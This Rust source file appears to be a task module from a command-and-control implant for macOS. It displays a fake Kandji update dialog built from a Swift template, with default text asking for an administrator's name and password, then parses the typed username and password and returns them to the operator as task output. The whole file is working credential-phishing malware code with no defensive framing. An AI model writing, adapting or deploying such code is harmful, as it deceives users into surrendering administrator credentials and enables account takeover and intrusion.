use crate::structs::Task;
use serde::Deserialize;
use std::io::Write;
use tokio::process::Command;

const SWIFT_TEMPLATE: &str = include_str!("dialog_template.swift");

#[derive(Deserialize)]
struct PromptArgs {
    #[serde(default)]
    title: String,
    #[serde(default)]
    message: String,
    #[serde(default = "default_max_tries")]
    max_tries: i32,
}

fn default_max_tries() -> i32 {
    1
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: PromptArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let title = if args.title.is_empty() {
        "Kandji"
    } else {
        &args.title
    };
    let message = if args.message.is_empty() {
        "An update is ready to install. Kandji is trying to add a new helper tool.\n\nEnter an administrator's name and password to allow this."
    } else {
        &args.message
    };

    let swift_source = SWIFT_TEMPLATE
        .replace("TITLE_PLACEHOLDER", title)
        .replace("MESSAGE_PLACEHOLDER", message);

    let mut attempts = 0;
    let mut result_output = String::new();

    while attempts < args.max_tries {
        attempts += 1;

        // Write the Swift script to a temp file and execute it
        let tmp_path = std::env::temp_dir().join(format!("prompt_{}.swift", std::process::id()));
        let mut tmp = match std::fs::File::create(&tmp_path) {
            Ok(f) => f,
            Err(e) => {
                result_output = format!("Failed to create temp file: {}", e);
                break;
            }
        };

        if let Err(e) = tmp.write_all(swift_source.as_bytes()) {
            result_output = format!("Failed to write Swift script: {}", e);
            break;
        }
        drop(tmp);

        match Command::new("swift")
            .arg(&tmp_path)
            .output()
            .await
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout);

                // Parse username= and password= lines from output
                let mut username = String::new();
                let mut password = String::new();
                for line in stdout.lines() {
                    if let Some(val) = line.strip_prefix("username=") {
                        username = val.to_string();
                    } else if let Some(val) = line.strip_prefix("password=") {
                        password = val.to_string();
                    }
                }

                let _ = std::fs::remove_file(&tmp_path);

                if !password.is_empty() {
                    result_output = format!("username={}\npassword={}", username, password);
                    break;
                } else if output.status.success() {
                    result_output = format!(
                        "User submitted empty password (attempt {}/{})",
                        attempts, args.max_tries
                    );
                } else {
                    // User cancelled
                    result_output = format!("User cancelled the dialog (attempt {}/{})", attempts, args.max_tries);
                    break;
                }
            }
            Err(e) => {
                let _ = std::fs::remove_file(&tmp_path);
                result_output = format!("Failed to execute Swift script: {}", e);
                break;
            }
        }
    }

    response.user_output = result_output;
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
